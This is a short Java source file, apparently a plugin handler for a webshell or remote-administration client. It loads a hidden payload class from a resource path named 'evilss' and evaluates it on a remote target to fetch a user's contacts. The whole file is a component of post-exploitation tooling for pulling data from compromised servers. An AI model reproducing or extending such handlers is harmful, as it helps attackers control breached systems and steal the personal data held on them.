/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template
 */
package com.theplutin.handler;

import util.functions;
import util.http.ReqParameter;

/**
 *
 * @author Administrator
 */
public class GetContacts extends HandlerBase{
    public String handler(String username){
//        GetContacts.classs
        this.payload.include("GetContacts", functions.readInputStreamAutoClose(this.getClass().getResourceAsStream("/evilss/SearchAPI.classs")));
        ReqParameter reqParameter = ReqParameter.createInvokeMethodReqParameter();
        reqParameter.add("username", username);
        return encoding.Decoding(payload.evalFunc("GetContacts", "getContacts", reqParameter));
    }
}
